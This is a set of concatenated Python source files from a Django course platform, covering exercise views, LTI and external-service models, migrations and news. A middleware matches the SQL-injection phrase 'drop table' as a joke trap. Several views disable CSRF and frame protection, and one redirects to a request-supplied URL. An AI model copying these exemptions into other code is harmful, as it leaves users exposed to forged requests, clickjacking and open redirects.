from lib.viewbase import BaseRedirectMixin, BaseView
from .models import LearningObject, LearningObjectDisplay
from .protocol.exercise_page import ExercisePage
from .submission_models import SubmittedFile, Submission
from .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView

from .exercisecollection_models import ExerciseCollection
from .exercise_summary import UserExerciseSummary
from django.urls import reverse


class TableOfContentsView(CourseInstanceBaseView):
    template_name = ""exercise/toc.html""


class ResultsView(TableOfContentsView):
    template_name = ""exercise/results.html""


class ExerciseInfoView(ExerciseBaseView):
    ajax_template_name = ""exercise/_exercise_info.html""

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()


class ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):
    template_name = ""exercise/exercise.html""
    ajax_template_name = ""exercise/exercise_plain.html""
    post_url_name = ""exercise""
    access_mode = ACCESS.STUDENT

    # Allow form posts without the cross-site-request-forgery key.
    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)

    def get_access_mode(self):
        access_mode = super().get_access_mode()

        # Loosen the access mode if exercise is enrollment
        if (self.exercise.status in (
                LearningObject.STATUS.ENROLLMENT,
                LearningObject.STATUS.ENROLLMENT_EXTERNAL,
              ) and access_mode == ACCESS.STUDENT):
            access_mode = ACCESS.ENROLL

        return access_mode

    def get(self, request, *args, **kwargs):
        exercisecollection = None
        exercisecollection_title = None
        submission_allowed = False
        disable_submit = False
        should_enroll = False
        issues = []
        students = [self.profile]

        if self.exercise.is_submittable:
            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS
            submission_status, submission_allowed, issues, students = self.submission_check()
            self.get_summary_submissions()
            disable_submit = submission_status in [
                SUBMIT_STATUS.CANNOT_ENROLL,
                SUBMIT_STATUS.NOT_ENROLLED,
            ]
            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED

        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE
              or self.module.status == CourseModule.STATUS.MAINTENANCE):
            if self.is_course_staff:
                issue = _(""Exercise is in maintenance and content is hidden ""
                          ""from students."")
                messages.error(request, issue)
                issues.append(issue)
            else:
                page = ExercisePage(self.exercise)
                page.content = _('Unfortunately this exercise is currently '
                                 'under maintenance.')
                return super().get(request, *args, page=page, students=students, **kwargs)

        if hasattr(self.exercise, 'generate_table_of_contents') \
              and self.exercise.generate_table_of_contents:
            self.toc = self.content.children_hierarchy(self.exercise)
            self.note(""toc"")

        page = self.exercise.as_leaf_class().load(request, students,
            url_name=self.post_url_name)

        if self.profile:
            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)

        if isinstance(self.exercise, ExerciseCollection):
            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)

        return super().get(request,
                           *args,
                           page=page,
                           students=students,
                           submission_allowed=submission_allowed,
                           disable_submit=disable_submit,
                           should_enroll=should_enroll,
                           issues=issues,
                           exercisecollection=exercisecollection,
                           exercisecollection_title=exercisecollection_title,
                           **kwargs)

    def post(self, request, *args, **kwargs):
        # Stop submit trials for e.g. chapters.
        # However, allow posts from exercises switched to maintenance status.
        if not self.exercise.is_submittable:
            return self.http_method_not_allowed(request, *args, **kwargs)

        new_submission = None
        page = ExercisePage(self.exercise)
        submission_status, submission_allowed, issues, students = (
            self.submission_check(True, request)
        )
        if submission_allowed:
            new_submission = Submission.objects.create_from_post(
                self.exercise, students, request)
            if new_submission:
                page = self.exercise.grade(request, new_submission,
                    url_name=self.post_url_name)

                # Enroll after succesfull enrollment exercise.
                if self.exercise.status in (
                    LearningObject.STATUS.ENROLLMENT,
                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,
                ) and new_submission.status == Submission.STATUS.READY:
                    self.instance.enroll_student(self.request.user)

                # Redirect non AJAX normally to submission page.
                if not request.is_ajax() and ""__r"" not in request.GET:
                    return self.redirect(new_submission.get_absolute_url() +
                        (""?wait=1"" if page.is_wait else """"))
            else:
                messages.error(request,
                    _(""The submission could not be saved for some reason. ""
                      ""The submission was not registered.""))

            # Redirect non AJAX content page request back.
            if not request.is_ajax() and ""__r"" in request.GET:
                return self.redirect(request.GET[""__r""], backup=self.exercise);

        self.get_summary_submissions()
        return self.response(page=page, students=students,
            submission=new_submission)

    def submission_check(self, error=False, request=None):
        if not self.profile:
            issue = _(""You need to sign in and enroll to submit exercises."")
            messages.error(self.request, issue)
            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []
        submission_status, issues, students = (
            self.exercise.check_submission_allowed(self.profile, request)
        )
        if len(issues) > 0:
            if error:
                messages.error(self.request, ""\n"".join(issues))
            else:
                messages.warning(self.request, ""\n"".join(issues))
        submission_allowed = (
            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED
        )
        return submission_status, submission_allowed, issues, students


    def __load_exercisecollection(self, request):
        user = self.profile.user

        if user.is_authenticated:
            self.exercise.check_submission(user, no_update=True)

        target_exercises = []
        for t_exercise in self.exercise.exercises:
            it = t_exercise.parent
            ex_url = it.url
            it = it.parent
            while it is not None:
                ex_url = it.url + '/' + ex_url
                it = it.parent

            ex_name = t_exercise.name
            for candidate in t_exercise.name.split('|'):
                if request.LANGUAGE_CODE in candidate:
                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]

            data = {""exercise"": t_exercise,
                    ""url"": reverse(""exercise"", kwargs={
                        ""course_slug"": t_exercise.course_module.course_instance.course.url,
                        ""instance_slug"": t_exercise.course_module.course_instance.url,
                        ""module_slug"": t_exercise.course_module.url,
                        ""exercise_path"": ex_url,
                    }),
                    ""title"": ex_name,
                    ""max_points"": t_exercise.max_points,
                    ""user_points"": UserExerciseSummary(t_exercise, request.user).get_points(),
                    }
            target_exercises.append(data)

        title = ""{}: {} - {}"".format(t_exercise.course_module.course_instance.course.name,
                                     t_exercise.course_module.course_instance.instance_name,
                                     t_exercise.category.name)

        return target_exercises, title


class ExercisePlainView(ExerciseView):
    raise_exception=True
    force_ajax_template=True
    post_url_name=""exercise-plain""

    # Allow form posts without the cross-site-request-forgery key.
    # Allow iframe in another domain.
    @method_decorator(csrf_exempt)
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class ExerciseModelView(ExerciseModelBaseView):
    template_name = ""exercise/model.html""
    ajax_template_name = ""exercise/_model_files.html""
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.models = []
        for url,name in self.exercise.get_models():
            try:
                response = request_for_response(url)
            except RemotePageNotFound:
                self.models.append({'name': name})
            else:
                self.models.append({
                    'name': name,
                    'content': response.text,
                    'html': 'text/html' in response.headers.get('Content-Type'),
                })
        self.note('models')


class ExerciseTemplateView(ExerciseTemplateBaseView):
    template_name = ""exercise/template.html""
    ajax_template_name = ""exercise/_template_files.html""
    access_mode = ACCESS.ENROLLED

    def get_common_objects(self):
        super().get_common_objects()
        self.get_summary_submissions()
        self.templates = []
        for url,name in self.exercise.get_templates():
            response = request_for_response(url)
            self.templates.append({
                'name': name,
                'content': response.text,
                'html': 'text/html' in response.headers.get('Content-Type'),
            })
        self.note('templates')


class SubmissionView(SubmissionBaseView):
    template_name = ""exercise/submission.html""
    ajax_template_name = ""exercise/submission_plain.html""

    def get_common_objects(self):
        super().get_common_objects()
        self.page = { ""is_wait"": ""wait"" in self.request.GET }
        self.note(""page"")
        #if not self.request.is_ajax():
        self.get_summary_submissions()


class SubmissionPlainView(SubmissionView):
    raise_exception=True
    force_ajax_template=True

    # Allow iframe in another domain.
    @method_decorator(xframe_options_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request, *args, **kwargs)


class SubmissionPollView(SubmissionMixin, BaseView):

    def get(self, request, *args, **kwargs):
        return HttpResponse(self.submission.status, content_type=""text/plain"")


class SubmittedFileView(SubmissionMixin, BaseView):
    file_kw = ""file_id""
    file_name_kw = ""file_name""

    def get_resource_objects(self):
        super().get_resource_objects()
        file_id = self._get_kwarg(self.file_kw)
        file_name = self._get_kwarg(self.file_name_kw)
        self.file = get_object_or_404(
            SubmittedFile,
            id=file_id,
            submission=self.submission
        )
        if self.file.filename != file_name:
            raise Http404()

    def get(self, request, *args, **kwargs):
        with open(self.file.file_object.path, ""rb"") as f:
            bytedata = f.read()

        # Download the file.
        if request.GET.get(""download"", False):
            response = HttpResponse(bytedata,
                content_type=""application/octet-stream"")
            response[""Content-Disposition""] = 'attachment; filename=""{}""'\
                .format(self.file.filename)
            return response

        if self.file.is_passed():
            return HttpResponse(bytedata, content_type=self.file.get_mime())

        return HttpResponse(bytedata.decode('utf-8', 'ignore'),
            content_type='text/plain; charset=""UTF-8""')
/n/n/nexternal_services/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('inheritance', '0001_initial'),
        ('course', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='LinkService',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance', on_delete=models.CASCADE)),
                ('url', models.CharField(help_text=b'The service URL', max_length=256)),
                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),
                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),
                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),
            ],
            options={
                'ordering': ['menu_label'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='LTIService',
            fields=[
                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService', on_delete=models.CASCADE)),
                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),
                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),
            ],
            options={
            },
            bases=('external_services.linkservice',),
        ),
        migrations.CreateModel(
            name='MenuItem',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),
                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),
                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),
                ('enabled', models.BooleanField(default=True)),
                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.', on_delete=models.CASCADE)),
                ('service', models.ForeignKey(to='external_services.LinkService', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['course_instance', 'menu_weight', 'menu_label'],
            },
            bases=(models.Model,),
        ),
    ]
/n/n/nexternal_services/migrations/0002_auto_20150427_1717.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0001_initial'),
    ]

    operations = [
        migrations.AlterField(
            model_name='linkservice',
            name='enabled',
            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_icon_class',
            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='menu_label',
            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='linkservice',
            name='url',
            field=models.CharField(help_text='The service URL', max_length=256),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_key',
            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='ltiservice',
            name='consumer_secret',
            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_weight',
            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),
            preserve_default=True,
        ),
    ]
/n/n/nexternal_services/migrations/0005_auto_20160829_1344.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
    ]

    operations = [
        migrations.AddField(
            model_name='menuitem',
            name='menu_group_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='menuitem',
            name='menu_url',
            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='course_instance',
            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_icon_class',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='menu_label',
            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='menuitem',
            name='service',
            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True, on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/nexternal_services/models.py/n/nfrom django.core.exceptions import ValidationError
from django.urls import reverse
from django.db import models
from django.utils.functional import cached_property
from django.utils.translation import gettext_lazy as _
from urllib.parse import urljoin, urlsplit

from course.models import CourseInstance
from inheritance.models import ModelWithInheritance
from lib.helpers import Enum
from lib.models import UrlMixin


def validate_no_domain(value):
    if value and '://' in value:
        raise ValidationError(_(""Url can not contain scheme or domain part.""))


class LinkService(ModelWithInheritance):
    '''
    A link to an external service.
    '''
    DESTINATION_REGION = Enum([
        ('INTERNAL', 0, _('Destination is hosted internally. Link to internal privacy notice.')),
        ('ORGANIZATION', 1, _('Destination is hosted in the same organization. Link to a privacy notice.')),
        ('EEA', 3, _('Destination is hosted in European Economic Area. Link to a privacy notice.')),
        ('PRIVACYSHIELD', 5, _('Destination is hosted out side of European Economic Area, but certified under EU-US Privacy Shield. Link to an extended privacy notice.')),
        ('GLOBAL', 6, _('Destination is hosted out side of European Economic Area. Link to an extended privacy notice.')),
    ])
    url = models.CharField(
        max_length=256,
        help_text=_(""The service URL"")
    )
    destination_region = models.PositiveSmallIntegerField(
        choices=DESTINATION_REGION.choices,
        default=DESTINATION_REGION.GLOBAL,
        help_text=_(""The geographical area of the destination. Will display correct user notice.""),
    )
    privacy_notice_url = models.CharField(
        max_length=512,
        blank=True,
        help_text=_(""A link to the service privacy notice. This is mandatory for services outside organization!""))
    menu_label = models.CharField(
        max_length=255,
        help_text=_(""A default label to show in the course menu."")
    )
    menu_icon_class = models.CharField(
        max_length=32,
        default=""globe"",
        help_text=_(""A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs"")
    )
    enabled = models.BooleanField(
        default=True,
        help_text=_(""If not enabled, the service is disabled for all course instances."")
    )

    class Meta:
        ordering = [""menu_label""]

    def __str__(self):
        out = ""{}: {}"".format(self.menu_label, self.url)
        if not self.enabled:
            return ""[Disabled] "" + out
        return out

    def clean(self):
        errors = {}
        if self.destination_region > self.DESTINATION_REGION.ORGANIZATION and not self.privacy_notice_url:
            errors['privacy_notice_url'] = ValidationError(_('Privacy notice URL is mandatory for services outside organization.'))
        if errors:
            raise ValidationError(errors)

    @property
    def url_parts(self):
        return urlsplit(self.url)

    @property
    def method(self):
        return 'GET'

    @property
    def sends_user_info(self):
        return False

    def get_url(self, replace=None, kwargs={}):
        '''Return the URL to the launch page of this service.'''
        if self.destination_region > self.DESTINATION_REGION.INTERNAL:
            return reverse('external-service-link', kwargs=kwargs)
        return self.get_final_url(replace)

    def get_final_url(self, replace=None):
        '''Return the launch URL for this service.

        The optional replace parameter may be a relative URL that is joined to
        the URL path of this service. The relative URL must not include a domain.
        '''
        url = self.url
        if replace:
            assert '://' not in replace and not replace.startswith('//'), ""Replace can't include domain""
            url = urljoin(url, replace)
        return url


class LTIService(LinkService):
    '''
    A provider of an LTI service.
    '''
    LTI_ACCESS = Enum([
        ('ANON_API_NO', 0, _('Anonymous service, no API access')),
        ('PUBLIC_API_NO', 5, _('Public service, no API access')),
        ('PUBLIC_API_YES', 10, _('Public service, allow API access')),
    ])
    access_settings = models.IntegerField(
        choices=LTI_ACCESS.choices,
        default=LTI_ACCESS.ANON_API_NO,
        help_text=_(""Select whether to pass pseudonymised user data to the LTI service.<br>Public services can also enable sharing the user's API token and course API URL in the LTI launch request. This grants the LTI tool API access with the user's privileges."")
    )
    consumer_key = models.CharField(
        max_length=128,
        help_text=_(""The consumer key provided by the LTI service."")
    )
    consumer_secret = models.CharField(
        max_length=128,
        help_text=_(""The consumer secret provided by the LTI service."")
    )

    def __str__(self):
        out = ""(LTI) {}: {}"".format(self.menu_label, self.url)
        if not self.enabled:
            return ""[Disabled] "" + out
        return out

    @property
    def method(self):
        return 'POST'

    @property
    def sends_user_info(self):
        return True

    @property
    def is_anonymous(self):
        return self.access_settings == self.LTI_ACCESS.ANON_API_NO

    @property
    def api_access(self):
        return self.access_settings == self.LTI_ACCESS.PUBLIC_API_YES

    def get_url(self, replace=None, kwargs={}):
        return reverse('lti-login', kwargs=kwargs)


class MenuItemManager(models.Manager):

    def get_queryset(self):
        return super().get_queryset().select_related(
            'course_instance', 'course_instance__course')


class MenuItem(UrlMixin, models.Model):
    '''
    Attaches link to course menu.
    '''
    ACCESS = Enum([
        ('STUDENT', 0, _(""All students, assistants and teachers can access."")),
        ('ASSISTANT', 5, _(""Only assistants and teachers can access."")),
        ('TEACHER', 10, _(""Only teachers can access."")),
    ])
    course_instance = models.ForeignKey(
        CourseInstance,
        on_delete=models.CASCADE,
        related_name=""ext_services"",
        help_text=_(""A course where the menu item exists."")
    )
    access = models.IntegerField(
        choices=ACCESS.choices,
        default=ACCESS.STUDENT,
    )
    service = models.ForeignKey(
        LinkService,
        on_delete=models.CASCADE,
        blank=True,
        null=True,
        help_text=_(""An external service to link to. These are configured by administrators."")
    )
    menu_url = models.CharField(
        max_length=256,
        blank=True,
        null=True,
        validators=[validate_no_domain],
        help_text=_(""""""URL that is a) relative to the service URL or b) this course if no service is selected.
Case a: url starting with / overwrites path in service url and extends it otherwise.
case b: url starting with / is absolute within this service and relative to the course path otherwise.
Note that URL entered here can not include scheme or domain."""""")
    )
    menu_group_label = models.CharField(
        max_length=255,
        blank=True,
        null=True,
        help_text=_(""Places menu item under a group label."")
    )
    menu_label = models.CharField(
        max_length=255,
        blank=True,
        null=True,
        help_text=_(""Label for the menu link (else service default)."")
    )
    menu_icon_class = models.CharField(
        max_length=32,
        null=True,
        blank=True,
        help_text=_(""Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs"")
    )
    menu_weight = models.IntegerField(
        default=0,
        help_text=_(""Heavier menu entries are placed after lighter ones."")
    )
    enabled = models.BooleanField(default=True)

    class Meta:
        ordering = [""course_instance"", ""menu_weight"", ""menu_label""]

    def __str__(self):
        out = self.label
        if not self.is_enabled:
            return ""[Disabled] "" + out
        return out

    def clean(self):
        errors = {}
        if not self.service:
            if not self.menu_url:
                errors['menu_url'] = ValidationError(_('Relative URL is required when there is no preconfigured service selected.'))
            if not self.menu_label:
                errors['menu_label'] = ValidationError(_('Menu label is required when there is no preconfigured service selected.'))
        if errors:
            raise ValidationError(errors)

    @cached_property
    def is_enabled(self):
        if self.service:
            return self.service.enabled and self.enabled
        return self.enabled

    @cached_property
    def label(self):
        if self.menu_label:
            return self.menu_label
        if self.service:
            return self.service.menu_label
        return """"

    @cached_property
    def icon_class(self):
        if self.menu_icon_class:
            return self.menu_icon_class
        if self.service:
            return self.service.menu_icon_class
        return """"

    @cached_property
    def url(self):
        if self.service:
            kwargs = {
                ""course_slug"": self.course_instance.course.url,
                ""instance_slug"": self.course_instance.url,
                ""menu_id"": self.id,
            }
            return self.service.as_leaf_class().get_url(replace=self.menu_url, kwargs=kwargs)
        if '://' in self.menu_url:
            # Deprecated, but DB can have old urls
            return self.menu_url
        return urljoin(self.course_instance.get_absolute_url(), self.menu_url)

    @cached_property
    def final_url(self):
        if self.service:
            return self.service.as_leaf_class().get_final_url(self.menu_url)
        else:
            return urljoin(self.course_instance.get_absolute_url(), self.menu_url)

    def get_url_kwargs(self):
        return dict(menu_id=self.id, **self.course_instance.get_url_kwargs())
/n/n/ninheritance/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='ModelWithInheritance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True, on_delete=models.CASCADE)),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
    ]
/n/n/ninheritance/models.py/n/nfrom django.contrib.contenttypes.models import ContentType
from django.db import models
from django.db.models.query import QuerySet


class SubclassingQuerySet(QuerySet):
    def __getitem__(self, k):
        result = super(SubclassingQuerySet, self).__getitem__(k)
        if isinstance(result, models.Model) :
            return result.as_leaf_class()
        else :
            return result

    def __iter__(self):
        for item in super(SubclassingQuerySet, self).__iter__():
            yield item.as_leaf_class()


class LeafManager(models.Manager):
    def get_queryset(self):
        return SubclassingQuerySet(self.model)


class ModelWithInheritance(models.Model):
    """"""
    BaseExercise is the base class for all exercise types.
    It contains fields that are shared among all types.
    """"""

    objects                 = models.Manager()

    # This ModelManager may be used for retrieving the exercises as instances of their leaf classes.
    # Alternatively each exercise may be fetched individually as leaf instance by calling the as_leaf_class method.
    leaf_objects            = LeafManager()
    content_type            = models.ForeignKey(ContentType,
                                                on_delete=models.CASCADE,
                                                editable=False,
                                                null=True)

    class Meta:
        abstract = False

    def save(self, *args, **kwargs):
        """"""
        Overrides the default save method from Django. If the method is called for
        a new model, its content type will be saved in the database as well. This way
        it is possible to later determine if the model is an instance of the
        class itself or some of its subclasses.
        """"""

        if not self.content_type:
            self.content_type = ContentType.objects.get_for_model(self.__class__)

        super(ModelWithInheritance, self).save(*args, **kwargs)

    def as_leaf_class(self):
        """"""
        Checks if the object is an instance of a certain class or one of its subclasses.
        If the instance belongs to a subclass, it will be returned as an instance of
        that class.
        """"""

        content_type = self.content_type
        model_class = content_type.model_class()
        if (model_class == self.__class__):
            return self
        return model_class.objects.get(id=self.id)
/n/n/nlib/email_messages.py/n/nimport logging
import traceback
from django.conf import settings
from django.core.mail import send_mail
from django.urls import reverse

logger = logging.getLogger('lib.email_messages')


def email_course_error(request, exercise, message, exception=True):
    """"""
    Sends error message to course teachers or technical support emails if set.
    """"""
    instance = exercise.course_instance
    if instance.technical_error_emails:
        recipients = instance.technical_error_emails.split("","")
    else:
        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)

    error_trace = ""-""
    if exception:
        error_trace = traceback.format_exc()

    subject = settings.EXERCISE_ERROR_SUBJECT.format(
        course=instance.course.code,
        exercise=str(exercise))
    body = settings.EXERCISE_ERROR_DESCRIPTION.format(
        message=message,
        exercise_url=request.build_absolute_uri(
            exercise.get_absolute_url()),
        course_edit_url=request.build_absolute_uri(
            instance.get_url('course-details')),
        error_trace=error_trace,
        request_fields=repr(request))
    if recipients:
        try:
            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)
        except Exception as e:
            logger.exception('Failed to send error emails.')
/n/n/nlib/middleware.py/n/n""""""
This middleware is an easter egg! It is invoked when any request parameters
contain the string ""drop table"" (a potential SQL injection) and prevents the
user from loading any pages. Instead, a response with internal server error code
is returned with a ""funny"" error message. The SQL injection attempt is stored in
the session, so that the problem persists even if the user reloads the page.
Other users and the actual system are not affected by this middleware.

The normal behavior can be restored by giving any request parameter value with the
string ""restore table"" in it.
""""""

from django.http import HttpResponseServerError

class SqlInjectionMiddleware(object):

    def process_request(self, request):
        for var in request.GET:
            val = request.GET.get(var).lower()
            if ""drop table"" in val:
                request.session[""hack_attempt""] = val
            if ""restore table"" in val and ""hack_attempt"" in request.session:
                del request.session[""hack_attempt""]

        if ""hack_attempt"" in request.session:
            return HttpResponseServerError(""Traceback (most recent call last):\nFile \""egg.py\"", line 1337, in aplus\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier"", content_type=""text/plain"")

        return None
/n/n/nlib/models.py/n/nfrom django.urls import reverse


class UrlMixin(object):
    def get_url(self, name, **add_kwargs):
        kwargs = self.get_url_kwargs()
        kwargs.update(add_kwargs)
        return reverse(name, kwargs=kwargs)

    def get_display_url(self):
        return self.get_absolute_url()

    def get_absolute_url(self):
        if not hasattr(self, 'ABSOLUTE_URL_NAME'):
            raise NotImplementedError(""Model %r doesn't have absolute url"" % self)
        return self.get_url(self.ABSOLUTE_URL_NAME)

    def get_edit_url(self):
        if not hasattr(self, 'EDIT_URL_NAME'):
            raise NotImplementedError(""Model %r doesn't have absolute url"" % self)
        return self.get_url(self.EDIT_URL_NAME)


def install_defer_logger():
    import logging
    import traceback
    from django.db.models.query_utils import DeferredAttribute

    logger = logging.getLogger('django.db.deferred')
    orig_get = DeferredAttribute.__get__

    logger.warning(""Installing logger for deferred model fields..."")

    def get(self, instance, cls=None):
        if instance is None:
            return self
        if self.field_name not in instance.__dict__:
            filename, linenum, funcname, command = tuple(traceback.extract_stack()[-2])
            logger.warning(""Resolving deferred: %s.%s in %s, line %s, func %s: %s"", instance.__class__.__name__, self.field_name, filename, linenum, funcname, command)
        return orig_get(self, instance, cls=cls)
    DeferredAttribute.__get__ = get
/n/n/nnews/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='News',
            fields=[
                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),
                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),
                ('publish', models.DateTimeField(default=django.utils.timezone.now)),
                ('title', models.CharField(max_length=255)),
                ('body', models.TextField()),
                ('pin', models.BooleanField(default=False)),
                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news', on_delete=models.CASCADE)),
            ],
            options={
                'ordering': ['course_instance', '-pin', '-publish'],
            },
            bases=(models.Model, lib.models.UrlMixin),
        ),
    ]
/n/n/nnews/models.py/n/nfrom django.db import models
from django.utils.translation import ugettext_lazy as _
from django.utils import timezone

from course.models import CourseInstance
from lib.helpers import Enum
from lib.models import UrlMixin


class News(models.Model, UrlMixin):
    AUDIENCE = CourseInstance.ENROLLMENT_AUDIENCE
    ALERT = Enum([
        ('NONE', '', _('No alert')),
        ('SUCCESS', 'success', _('Green / Success')),
        ('INFO', 'info', _('Blue / Info')),
        ('WARNING', 'warning', _('Yellow / Warning')),
        ('DANGER', 'danger', _('Red / Danger')),
    ])
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,
        related_name=""news"")
    audience = models.IntegerField(choices=AUDIENCE.choices, default=AUDIENCE.ALL_USERS)
    publish = models.DateTimeField(default=timezone.now)
    title = models.CharField(max_length=255)
    body = models.TextField()
    pin = models.BooleanField(default=False)
    alert = models.CharField(max_length=8, blank=True, choices=ALERT.choices, default=ALERT.NONE)

    class Meta:
        ordering = ['course_instance', '-pin', '-publish']

    def __str__(self):
        return ""{} {}"".format(str(self.publish), self.title)

    def get_url_kwargs(self):
        return dict(news_id=self.id, **self.course_instance.get_url_kwargs())
/n/n/nnews/templatetags/news.py/n/nfrom django import template
from django.utils import timezone

from lib.errors import TagUsageError
from ..cache import CachedNews
from ..models import News


register = template.Library()


@register.inclusion_tag(""news/user_news.html"", takes_context=True)
def user_news(context, num, more=0):
    if not 'instance' in context:
        raise TagUsageError()
    if not 'now' in context:
        context['now'] = timezone.now()
    if not 'course_news' in context:
        context['course_news'] = CachedNews(context['instance'])
    news = context['course_news']

    if context['is_course_staff']:
        alerts,news = news.for_staff()
    else:
        user = context['request'].user
        alerts,news = news.for_user(
